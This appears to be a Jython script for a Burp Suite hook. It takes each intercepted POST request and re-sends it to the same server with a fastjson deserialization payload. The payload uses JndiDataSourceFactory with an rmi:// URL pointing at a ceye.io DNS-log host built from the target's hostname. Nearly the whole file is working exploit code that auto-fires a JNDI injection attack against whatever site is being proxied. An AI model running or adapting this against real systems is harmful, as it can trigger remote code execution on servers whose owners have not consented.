# 
import urlparse
import requests

if  messageIsRequest:
        request = messageInfo.getRequest()
        analyzedRequest = helpers.analyzeRequest(messageInfo) # returns IResponseInfo
        headers = analyzedRequest.getHeaders()
        print(headers)

        url = str(analyzedRequest.getUrl())
        print(url)
        parsedTuple = urlparse.urlparse(url)
        payload_url = parsedTuple.netloc
        print(payload_url.split(":")[0])
        payload = '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://%s.dnslog.ceye.io/Exploit"}}' % payload_url.split(":")[0]
        import urllib
        import urllib2
        print(headers[0])
        header_lib = dict()
        if "POST" in headers[0]:

            for n in headers:
                if "HTTP/1." in n or "Host:" in n:
                    pass
                else:
                    #print n
                    tmp = str(n).split(":")
                    if len(tmp)==2:
                        header_lib[tmp[0]]= tmp[1].strip()
                    elif len(tmp)==3:
                        header_lib[tmp[0]]= tmp[1].strip()+tmp[2].strip()

            # proxies = {"http":"http://192.168.1.184:8080","https":"http://192.168.1.184:8080"}
            print("hackme")
            try:
                res=requests.post(url, headers=header_lib,data=payload,timeout=5)
                print (res.content)
            except:
                pass
